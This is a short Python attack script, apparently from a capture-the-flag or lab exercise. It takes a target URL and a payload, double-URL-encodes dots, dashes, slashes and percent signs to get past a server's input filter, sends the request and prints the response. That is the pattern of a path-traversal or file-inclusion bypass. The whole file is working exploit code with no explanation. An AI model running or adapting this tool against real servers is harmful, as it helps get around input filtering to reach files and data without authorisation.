#!/usr/bin/python3

import sys
import requests

forbidden = [".","-","/","%"]
target = sys.argv[1]
payload = sys.argv[2]

def double_encode(payload):
        first_encode = ""
        second_encode = ""

        for i in payload:
                if i in forbidden:
                        allowed = i.encode().hex()
                        bypassed = "%"+allowed
                        first_encode = first_encode + bypassed
                else:
                        first_encode = first_encode + i

        for i in first_encode:
                if i in forbidden:
                        allowed = i.encode().hex()
                        bypassed = "%"+allowed
                        second_encode = second_encode + bypassed
                else:
                        second_encode = second_encode + i

        return(second_encode)

def talk_to_server(target):
        r = requests.get(target+double_encode(payload))
        print(r.text)

talk_to_server(target)
